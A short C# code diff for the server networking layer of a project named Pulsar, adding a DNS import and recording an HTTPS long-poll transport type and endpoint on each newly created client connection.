@@ -1,4 +1,5 @@
-﻿using Pulsar.Common.Extensions;
+﻿using Pulsar.Common.DNS;
+using Pulsar.Common.Extensions;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
@@ -452,7 +453,11 @@ namespace Pulsar.Server.Networking
         {
             if (stream == null) throw new ArgumentNullException(nameof(stream));
 
-            var client = new Client(stream, remoteEndPoint, ServerCertificate);
+            var client = new Client(stream, remoteEndPoint, ServerCertificate)
+            {
+                Transport = TransportKind.HttpsLongPoll,
+                TransportEndpoint = remoteEndPoint?.ToString() ?? string.Empty
+            };
             AddClient(client);
             OnClientState(client, true);
             return client;
